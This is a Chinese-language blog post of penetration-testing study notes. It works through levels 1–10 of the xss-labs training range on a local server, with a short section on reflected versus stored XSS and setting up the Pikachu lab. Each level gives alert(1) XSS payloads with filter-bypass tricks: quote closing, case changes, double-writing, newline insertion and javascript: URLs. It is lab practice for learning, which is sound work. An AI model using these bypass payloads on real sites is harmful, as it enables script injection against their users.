{"title":"渗透测试笔记 - day18、19 XSS基础 ","date":"2022-02-02T00:00:00.000Z","date_formatted":{"ll":"Feb 2, 2022","L":"02/02/2022","MM-DD":"02-02"},"link":"2022/02/02/渗透测试笔记 - day18、19 XSS基础 ","updated":"2023-03-17T12:07:41.482Z","content":"<h2 id=\"html知识补充\">html知识补充<a title=\"#html知识补充\" href=\"#html知识补充\"></a></h2>\n<ul>\n<li>标签中可以嵌套标签</li>\n<li>标签可以插入属性，但是不能插入标签</li>\n<li>&lt;script&gt;标签：可以执行标签之间的cs代码</li>\n<li>左标签里面可以插入JS事件（属性），该事件可以触发js代码</li>\n<li>F12控制台可以执行JS代码</li>\n</ul>\n<h2 id=\"xss-labs-level-1\">xss-labs level-1<a title=\"#xss-labs-level-1\" href=\"#xss-labs-level-1\"></a></h2>\n<p>payload:127.0.0.1:7793/level1.php?name=&lt;script&gt;alert(1)&lt;/script&gt;</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111927113.png\" alt=\"image-20220221191950781\" loading=\"lazy\" class=\"φbp\"></p>\n<h2 id=\"xss-labs-level2\">xss-labs level2<a title=\"#xss-labs-level2\" href=\"#xss-labs-level2\"></a></h2>\n<p>payload:127.0.0.1:7793/level2.php?keyword=&lt;script&gt;alert(1)&lt;/script&gt;</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111927437.png\" alt=\"image-20220221195832215\" loading=\"lazy\" class=\"φbp\"></p>\n<p>普通xss注入无法注入，右键查看源码</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111927482.png\" alt=\"image-20220221195959413\" loading=\"lazy\" class=\"φbp\"></p>\n<p>发现&lt; &gt;符号放在了引号里，不能作为语言识别。于是尝试闭合掉引号。</p>\n<p>payload:127.0.0.1:7793/level2.php?keyword=&quot; onclick=alert(1) &quot;&amp;submit=%E6%90%9C%E7%B4%A2</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111927966.png\" alt=\"image-20220221203235490\" loading=\"lazy\" class=\"φbp\"></p>\n<p>也可以：</p>\n<p>payload:127.0.0.1:7793/level2.php?keyword=“&gt;&lt;script&gt;onmouseover=alert(1)&lt;/script&gt;&lt;”&amp;submit=%C3%A6%C2%90%C2%9C%C3%A7%C2%B4%C2%A2</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111927624.png\" alt=\"image-20220221201835718\" loading=\"lazy\" class=\"φbp\"></p>\n<h2 id=\"xss-labs-level-3\">xss-labs level-3<a title=\"#xss-labs-level-3\" href=\"#xss-labs-level-3\"></a></h2>\n<p>直接注入：</p>\n<p>payload;127.0.0.1:7793/level3.php?keyword=&lt;script&gt;alert(1)&lt;/script&gt;&amp;submit=%C3%A6%C2%90%C2%9C%C3%A7%C2%B4%C2%A2</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111927920.png\" alt=\"image-20220221202015245\" loading=\"lazy\" class=\"φbp\"></p>\n<p>使用双引号闭合：</p>\n<p>payload:127.0.0.1:7793/level3.php?keyword=&quot; onclick=alert(1) &quot;&amp;submit=%E6%90%9C%E7%B4%A2</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111927748.png\" alt=\"image-20220221203412215\" loading=\"lazy\" class=\"φbp\"></p>\n<p>失败。</p>\n<p>使用单引号闭合注入</p>\n<p>payload:127.0.0.1:7793/level3.php?keyword=’ onclick=alert(1) '&amp;submit=%E6%90%9C%E7%B4%A2</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111927885.png\" alt=\"image-20220221203434182\" loading=\"lazy\" class=\"φbp\"></p>\n<h1 id=\"hvv-day19-xss注入\">hvv-day19 XSS注入<a title=\"#hvv-day19-xss注入\" href=\"#hvv-day19-xss注入\"></a></h1>\n<h2 id=\"xss-labs-level4\">xss-labs level4<a title=\"#xss-labs-level4\" href=\"#xss-labs-level4\"></a></h2>\n<p>双引号闭合：</p>\n<p>payload:127.0.0.1:7793/level4.php?keyword=“+onclick=alert(1)+”&amp;submit=搜索</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111928042.png\" alt=\"image-20220223185223124\" loading=\"lazy\" class=\"φbp\"></p>\n<h2 id=\"xss-labs-level5\">xss-labs level5<a title=\"#xss-labs-level5\" href=\"#xss-labs-level5\"></a></h2>\n<p>检测过滤:</p>\n<p>&lt;script&gt;</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111928577.png\" alt=\"image-20220223190357082\" loading=\"lazy\" class=\"φbp\"></p>\n<p>onclick=alert(1)</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111928467.png\" alt=\"image-20220223190422434\" loading=\"lazy\" class=\"φbp\"></p>\n<p>均被禁用，使用js伪协议：</p>\n<p>payload:127.0.0.1:7793/level5.php?keyword=“&gt;<a href=javascript:alert(1)> 123123&gt;”&amp;submit=%E6%90%9C%E7%B4%A2</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111928441.png\" alt=\"image-20220223190819286\" loading=\"lazy\" class=\"φbp\"></p>\n<h2 id=\"xss-labs-level6\">xss-labs level6<a title=\"#xss-labs-level6\" href=\"#xss-labs-level6\"></a></h2>\n<p>检测过滤：</p>\n<p>&lt;script&gt;onclick=alert(1)&lt;a&gt;href=</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111928566.png\" alt=\"image-20220223192001153\" loading=\"lazy\" class=\"φbp\"></p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111928260.png\" alt=\"image-20220223192010372\" loading=\"lazy\" class=\"φbp\"></p>\n<p>过滤了&lt;script&gt;  on   href</p>\n<p>大小写绕过：</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111928023.png\" alt=\"image-20220223192105948\" loading=\"lazy\" class=\"φbp\"></p>\n<p>可以绕过，构造payload</p>\n<p>payload: 127.0.0.1:7793/level6.php?keyword=&quot; ONCLICK=alert(1) &quot;&amp;submit=%E6%90%9C%E7%B4%A2</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111928782.png\" alt=\"image-20220223192319994\" loading=\"lazy\" class=\"φbp\"></p>\n<h2 id=\"xss-labs-level7\">xss-labs level7<a title=\"#xss-labs-level7\" href=\"#xss-labs-level7\"></a></h2>\n<p>检测绕过：</p>\n<p>&lt;script&gt;onclick=alert(1)&lt;a href=&gt;</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111928025.png\" alt=\"image-20220223192547334\" loading=\"lazy\" class=\"φbp\"></p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111928964.png\" alt=\"image-20220223192558513\" loading=\"lazy\" class=\"φbp\"></p>\n<p>发现使用空绕过script、on、href，并且无法大小写绕过。</p>\n<p>使用双写绕过，于是使用双写绕过。</p>\n<p>构造payload</p>\n<p>payload: 127.0.0.1:7793/level7.php?keyword=<script>onclick=“&gt;<scriscriptpt>alert(1)</scriscriptpt>&gt;”&amp;submit=%E6%90%9C%E7%B4%A2</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111928651.png\" alt=\"image-20220223193026725\" loading=\"lazy\" class=\"φbp\"></p>\n<h2 id=\"xss-labs-level8\">xss-labs level8<a title=\"#xss-labs-level8\" href=\"#xss-labs-level8\"></a></h2>\n<p>随便输入点并查看源码</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111928552.png\" alt=\"image-20220223193307447\" loading=\"lazy\" class=\"φbp\"></p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111928688.png\" alt=\"image-20220223193256543\" loading=\"lazy\" class=\"φbp\"></p>\n<p>使用js伪协议</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111928289.png\" alt=\"image-20220223193351220\" loading=\"lazy\" class=\"φbp\"></p>\n<p>检测绕过：</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111928333.png\" alt=\"image-20220223193637680\" loading=\"lazy\" class=\"φbp\"></p>\n<p>发现关键词均被绕过。</p>\n<p>使用换行%0A绕过检测。</p>\n<p>构造payload：</p>\n<p>payload：127.0.0.1:7793/level8.php?keyword=javasc%0Aript:alert(1)&amp;submit=%C3%A6%C2%B7%C2%BB%C3%A5%C2%8A%C2%A0%C3%A5%C2%8F%C2%8B%C3%A6%C2%83%C2%85%C3%A9%C2%93%C2%BE%C3%A6%C2%8E%C2%A5</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111928095.png\" alt=\"image-20220223195114454\" loading=\"lazy\" class=\"φbp\"></p>\n<h2 id=\"xss-labs-level9\">xss-labs level9<a title=\"#xss-labs-level9\" href=\"#xss-labs-level9\"></a></h2>\n<p>js伪协议注入</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111928003.png\" alt=\"image-20220223195306380\" loading=\"lazy\" class=\"φbp\"></p>\n<p>显示不合法，猜测检测：</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111928650.png\" alt=\"image-20220223195505420\" loading=\"lazy\" class=\"φbp\"></p>\n<p>发现需要携带<a href=\"http://xn--1nu\" target=\"_blank\">http://或</a>。</p>\n<p>携带<a href=\"http://xn--2rqr87anydfvla487jb02cba\" target=\"_blank\">http://并使用注释注释掉</a></p>\n<p>构造payload:127.0.0.1:7793/level9.php?keyword=javascript:alert(1)//http:////&amp;submit=%E6%B7%BB%E5%8A%A0%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111928612.png\" alt=\"image-20220223195630167\" loading=\"lazy\" class=\"φbp\"></p>\n<p>发现有检测，用%0A绕过:</p>\n<p>payload：127.0.0.1:7793/level9.php?keyword=javas%0Acript:alert(1)//http:////&amp;submit=%E6%B7%BB%E5%8A%A0%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111928542.png\" alt=\"image-20220223195810424\" loading=\"lazy\" class=\"φbp\"></p>\n<h2 id=\"xss-labs-level10\">xss-labs level10<a title=\"#xss-labs-level10\" href=\"#xss-labs-level10\"></a></h2>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111928580.png\" alt=\"image-20220223200504279\" loading=\"lazy\" class=\"φbp\"></p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111928174.png\" alt=\"image-20220223200456567\" loading=\"lazy\" class=\"φbp\"></p>\n<p>查看源码，发现隐藏表单。随便输入试试：</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111928205.png\" alt=\"image-20220223200656307\" loading=\"lazy\" class=\"φbp\"></p>\n<p>发现只有t_sort传参成功。</p>\n<p>使用html语言特性可以在type之前使用type=&quot;text&quot;覆盖掉type=&quot;hidden&quot;属性，借此特性来更改表单属性以创造作用域。</p>\n<p>构造payload。</p>\n<p>payload:127.0.0.1:7793/level10.php?keyword=000000&amp;t_link=111111&amp;t_history=22222&amp;t_sort=&quot; onclick=alert(1) type=&quot;text<br>\n（由于后面有未闭合双引号，所以这里可以省掉text后面的双引号。）</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111928743.png\" alt=\"image-20220223201433160\" loading=\"lazy\" class=\"φbp\"></p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111928193.png\" alt=\"image-20220223201444511\" loading=\"lazy\" class=\"φbp\"></p>\n<h2 id=\"xss-labs前十关知识点总结\">xss-labs前十关知识点总结<a title=\"#xss-labs前十关知识点总结\" href=\"#xss-labs前十关知识点总结\"></a></h2>\n<p>第一关：&lt;script&gt;alert(1)&lt;/script&gt;<br>\n1、没有任何过滤。<br>\n2、输出在一对标签之间，插入另一对标签。<br>\n第二关：&quot; onclick=alert(1) &quot;<br>\n1、在页面源码第15行有输出，但是有过滤：把&lt;&gt;通过htmlspecialchars()函数进行html实体编码。<br>\n2、在页面源码第17有输出，输出在左标签里面，没有任何过滤。<br>\n3、通过闭合双引号插入onclick事件，进而通过点击触发alert()函数。<br>\n第三关：’ onclick=alert(1) ’<br>\n1、在页面源码第15行有输出，但是有过滤：把&lt;&gt;通过htmlspecialchars()函数进行html实体编码。<br>\n2、在页面源码第17行有输出，但是有过滤：把&lt;&gt;通过htmlspecialchars()函数进行html实体编码。<br>\n3、通过闭合单引号插入onclick事件，进而通过点击触发alert()函数。<br>\n第四关：&quot; onclick=alert(1) &quot;<br>\n1、在页面源码第15行有输出，但是有过滤：把&lt;&gt;通过htmlspecialchars()函数进行html实体编码。<br>\n2、在页面源码第17行有输出，但是有过滤：把&lt;&gt;通过str_replace()函数替换为空。<br>\n3、通过闭合双引号插入onclick事件，进而通过点击触发alert()函数。<br>\n第五关：“&gt;&lt;a href=javascript:alert(1)&gt;点击&lt;/a&gt;<br>\n1、在页面源码第15行有输出，但是有过滤：把&lt;&gt;通过htmlspecialchars()函数进行html实体编码。<br>\n2、在页面源码第17行有输出，但是有过滤：把&lt;script通过str_replace()函数替换为&lt;scr_ipt；把on替换为o_n。<br>\n3、通过”&gt;闭合&lt;input&gt;标签，再插入带有javascript伪协议的&lt;a&gt;标签，<br>\n第六关：&quot; ONclick=alert(1) &quot;<br>\n1、在页面源码第15行有输出，但是有过滤：把&lt;&gt;通过htmlspecialchars()函数进行html实体编码。<br>\n2、在页面源码第17行有输出，但是有过滤：把&lt;script通过str_replace()函数替换为&lt;scr_ipt；把on替换为o_n；src替换为sr_c；把data替换为da_ta；把href替换为hr_ef。<br>\n3、通过ON绕过小写on替换插入ONclick事件，进而通过点击触发alert()函数。<br>\n第七关：&quot; oonnclick=alert(1) &quot;<br>\n1、在页面源码第15行有输出，但是有过滤：把&lt;&gt;通过htmlspecialchars()函数进行html实体编码。<br>\n2、在页面源码第17行有输出，但是有过滤：强制转小写，并且把script、on、src、data、href替换为空。<br>\n3、通过双写，绕过替换为空，插入ONclick事件，进而通过点击触发alert()函数。<br>\n第八关：javascr%09ipt:alert(1)<br>\n1、在页面第17行有输出，但是有过滤，把on替换为o_n，并且进行了html实体编码。<br>\n2、在页面第20行有输出，但是有过滤，把on替换为o_n，并且进行了html实体编码。<br>\n3、通过向javascrit中插入特殊符号%0A、%09、%0D，绕过script的替换。<br>\n第九关：<br>\n1、在javascript中，可以使用//进行注释<br>\n第十关：<br>\n1、在html标签中：type=&quot;hidden&quot;表示隐藏该标签，可以向前插入type=&quot;text&quot;显示该标签，两者同时出现，优先执行左边的。</p>\n<h2 id=\"xss知识拓展\">xss知识拓展<a title=\"#xss知识拓展\" href=\"#xss知识拓展\"></a></h2>\n<p>反射型xss：注入命令不会被存储如数据库，运行一次仅在后端有一次注入效果。</p>\n<p>存储型xss：当xss注入命令被数据库所存储时，可反复引发注入命令。</p>\n<h2 id=\"实验：搭建pikachu-labs靶场\">实验：搭建pikachu-labs靶场<a title=\"#实验：搭建pikachu-labs靶场\" href=\"#实验：搭建pikachu-labs靶场\"></a></h2>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111928504.png\" alt=\"image-20220223205712088\" loading=\"lazy\" class=\"φbp\"></p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111928817.png\" alt=\"image-20220223205722128\" loading=\"lazy\" class=\"φbp\"></p>\n","prev":{"title":"渗透测试笔记 - day20 XSS实战","link":"2022/02/09/渗透测试笔记 - day20 XSS实战"},"next":{"title":"渗透测试笔记 - day16、17 HTML基础","link":"2022/01/25/渗透测试笔记 - day16、17 HTML基础"},"plink":"https://Lq0ne.github.io/2022/02/02/渗透测试笔记 - day18、19 XSS基础 /","toc":[{"id":"html知识补充","title":"html知识补充","index":"1"},{"id":"xss-labs-level-1","title":"xss-labs level-1","index":"2"},{"id":"xss-labs-level2","title":"xss-labs level2","index":"3"},{"id":"xss-labs-level-3","title":"xss-labs level-3","index":"4"}],"copyright":{"license":"个人原创 - 自由转载 - 保持署名 - 禁止商用","published":"February 2, 2022","author":"Lq0ne","link":"<a href=\"https://Lq0ne.github.io/2022/02/02/渗透测试笔记 - day18、19 XSS基础 /\" title=\"渗透测试笔记 - day18、19 XSS基础 \">https://Lq0ne.github.io/2022/02/02/渗透测试笔记 - day18、19 XSS基础 /</a>"},"reading_time":"666 words in 4 min"}